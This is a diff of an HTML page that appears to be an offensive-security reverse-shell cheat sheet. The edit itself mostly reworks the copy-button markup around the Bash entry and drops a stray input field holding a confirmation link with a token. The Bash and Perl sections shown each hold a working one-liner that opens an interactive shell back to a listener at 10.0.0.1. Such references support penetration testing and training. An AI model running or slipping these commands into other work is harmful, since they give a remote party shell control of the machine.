@@ -137,30 +137,9 @@
 					<p> </p>
 <h2 id="bash">Bash</h2>
 <p> </p>
-
-  <div class="input-group">
-    <input id="copied_text" type='text' class='form-control' />
-    <span class="input-group-btn">
-      <button class='btn btn-default' id="copier_btn" type="button" value="copy">
-        <i class='fa fa-copy'></i> Copy
-      </button>
-    </span>
-  </div>
-
-<div class="ui action input">
-<input type="text" class="copyInput" value="http://kushy.net/confirm/58493-2847593-3849?token=58349$3959$$8393038848">
-<button type="button" name="copyToken" value="copy" class="copyToken ui right icon button">
-<i class="clipboard icon"></i>
-</button>
-</div>
-
-</div>
-<p> </p>
-	<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-	<code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
-</code>
-	</pre>
-<p> </p>
+<div class="highlight">
+<span class="input-group-btn"><button class='btn btn-default' id="copier_btn" type="button" value="copy"><i class='fa fa-copy'></i> Copy</button></span><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p> </p>
 <h2 id="perl">Perl</h2>
 <p> </p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">perl -e <span style="color:#e6db74">&#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
@@ -196,6 +175,8 @@ p.waitFor<span style="color:#f92672">()</span>
 		</div>
 	</div>
 
+
+
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -211,7 +192,7 @@ if (!doNotTrack) {
 
 
 
-<script src="https://www.offsec.dev/js/canvas.js"></script>
+<script  src="https://www.offsec.dev/js/canvas.js"></script>
 <script src="https://www.offsec.dev/js/copy.js"></script>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <script src="https://www.offsec.dev/js/bootstrap.min.js"></script>
